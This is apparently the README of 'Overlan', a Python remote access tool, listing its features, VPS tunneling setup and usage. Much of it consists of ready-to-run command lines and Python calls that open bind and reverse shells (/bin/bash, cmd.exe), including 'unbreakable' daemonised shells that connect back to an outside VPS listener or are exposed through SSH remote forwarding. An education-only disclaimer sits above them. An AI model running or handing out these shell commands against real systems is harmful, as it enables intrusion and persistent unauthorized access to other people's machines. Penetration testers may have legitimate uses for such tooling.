# Overlan


Python Remote Access Tools


## Functionality

- Remote port forwarding (http & tcp)
- Local port forwarding (http & tcp)
- TCP listen
- TCP connect
- Unbreakable Bind Shell
- Unbreakable Reverse Shell
- Auto spawn pty (Unix only)
- AES derivation password protected
- Cross Platform

## Disclamer

THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE
CAUSED BY THIS PROGRAM.

## Intended for

+ Windows systems
+ Unix systems


## Requirements

+ pycryptodome
+ paramiko

## Install Overlan

	git clone https://github.com/YannBouyeron/overlan

	cd overlan

	python3 setup.py install
	
## Create SSH tunneling server and user on your VPS (Facultative)

Port forwarding requires using your own VPS with an SSH server. This allows you to expose a local service such as a http web server or tcp listener or bind shell on the internet.

Create tunneling restricted user overlan:

	sudo adduser overlan

Go to /etc/ssh 

	cd /etc/ssh

Add resticted user overlan to sshd_config:
 
	Match User overlan
   	
		AllowTcpForwarding yes
   	
		X11Forwarding yes
   	
		PermitTunnel yes
   	
		GatewayPorts yes
   	
		AllowAgentForwarding no
   	
		#PermitOpen localhost:62222
   	
		ForceCommand echo "no shell - only tunneling"
   	
		PasswordAuthentication yes

Restart sshd:

	sudo service sshd restart

You have now a restricted user:

	{
		"hostname":"<your VPS IP>",
		
		"username":"<overlan or another username>"

		"port":"<22 or another port>"

		"password":"<your secret password>"

	}


**Security Warning: If GatewayPorts is yes, enable remote forwarded bind shell without AES encryption is very dangerous ! Anybody can scan your IP and discover port running your remote forwarded bind shell and connect to it !**


## Commands Line Interface


#### Listen

Listen on localhost port 4444
	
	overlan -l 4444

Listen on localhost port 4444 password protected
	
	overlan -l 4444 -k mysecret

Listen on port 4444 and remote forward to your VPS port 8888
	
	overlan -l 4444 -R username:hostname:port:password:8888

#### Connect

Connect to localhost port 4444
	
	overlan localhost 4444

Connect to localhost port 4444 password protected 
	
	overlan localhost 4444 -k mysecret

Connect to your VPS port 4444
	
	overlan hostname 4444


#### Port forwarding

###### Overlan

Remote forward localhost 4444 to your VPS port 8888

	overlan 4444 -R username:hostname:port:password:8888

Local forward from your VPS port 8888 to localhost 4444

	overlan 4444 -L username:hostname:port:password:8888

Local forward from your VPS port 8888 to 0.0.0.0 4444

	overlan 0.0.0.0 4444 -L username:hostname:port:password:8888

###### SSH

Remote forward localhost 4444 to your VPS port 8888 

	ssh -N -R 8888:localhost:4444 username@hostname -p 22

Local forward localhost 4444 from your VPS port 8888 

	ssh -N -L 4444:localhost:8888 username@hostname -p 22

#### Bind Shell

Unix

- `overlan -l 4444 -e /bin/bash` - BindShell listen on localhost port 4444.

- `overlan -l 4444 -e pty:/bin/bash` - Interactive PTY BindShell listen on localhost port 4444. (Don't support password)

- `overlan -l 4444 -e pty:/bin/bash -R username:hostname:port:password:8888` - Interactive PTY BindShell listen on localhost port 4444 and remote forward to your VPS port 8888. (Don't support password)

- `overlan -l 4444 -e /bin/bash -R username:hostname:port:password:8888` - BindShell listen on port 4444 and remote forward to your VPS port 8888.
	
- `overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.

- `overlan -l 4444 -e /bin/bash -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forward to your VPS port 8888.

Windows

- `overlan -l 4444 -e cmd.exe` - BindShell listen on localhost port 4444.

- `overlan -l 4444 -e cmd.exe -R username:hostname:port:password:8888` - BindShell listen on port 4444 and remote forward to your VPS port 8888.
	
- `overlan -l 4444 -e cmd.exe -k mypassowrd` - Password protected BindShell listen on localhost port 4444.

- `overlan -l 4444 -e cmd.exe -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forward to your VPS port 8888.

#### Reverse Shell

Unix

- `overlan localhost 4444 -e /bin/bash` - ReverseShell connect to listener on localhost port 4444.

- `overlan localhost 4444 -e pty:/bin/bash` - Interactive PTY ReverseShell connect to listener on localhost port 4444. (Don't support password)

- `overlan hostname 4444 -e /bin/bash` - ReverseShell connect to listener on your VPS port 4444.

- `overlan localhost 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.

- `overlan hostname 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to your VPS port 4444.

Windows

- `overlan localhost 4444 -e cmd.exe` - ReverseShell connect to listener on localhost port 4444.

- `overlan hostname 4444 -e cmd.exe` - ReverseShell connect to listener on your VPS port 4444.

- `overlan localhost 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.

- `overlan hostname 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to your VPS port 4444.


## Help

- `overlan -h` - Print help message and exit.

```
usage: overlan [-h] [-l] [-e EXECUTE] [-c] [-R REMOTE] [-L LOCAL] [-k KEY]
               [-d DELAY]
               [host] port

positional arguments:
  host
  port

optional arguments:
  -h, --help            show this help message and exit
  -l, --listen          Listen on port specified
  -e EXECUTE, --execute EXECUTE
                        Executable: /bin/bash, /bin/sh, cmd.exe
  -c, --connect         Connect to host and port specified
  -R REMOTE, --remote REMOTE
                        Remote forward to
                        <username>:<host>:<port>:<password>:<remote_port>
  -L LOCAL, --local LOCAL
                        Local forward from
                        <username>:<host>:<port>:<password>:<remote_port>
  -k KEY, --key KEY     Password for AES derivation key
  -d DELAY, --delay DELAY
                        Timeout delay
```

## Use within python


Use on LAN:


```
from overlan import Overlan

v = Overlan()

```

Use on internet: Specify your VPS SSH server:

```
from overlan import Overlan

v = Overlan(username=<...>, hostname=<...>, port=<...>, password=<...>)
 
```

Listen

```
v.listen(<port>)
```

Connect:

```
v.connect(<host>, <port>)
```

Remote forward:

```
v.rf(<local_port>, <remote_port>)
```

Local forward:

```
v.lf(<local_port>, <remote_port>)
```

BindShell:

```
# linux

v.listen(<port>, executable="/bin/bash", key="somesecret")

# windows

v.listen(<port>, executable="cmd.exe", key="somesecret")

# as daemon

v.bs(<port>, executable="/bin/bash", key="somesecret")
```

ReverseShell:

```
#linux

v.connect(<host>, <port>, executable="/bin/bash", key="somesecret")

# windows

v.connect(<host>, <port>, executable="cmd.exe", key="somesecret")

# as daemon

v.rs(<host>, <port>, executable="/bin/bash", key="somesecret")
```


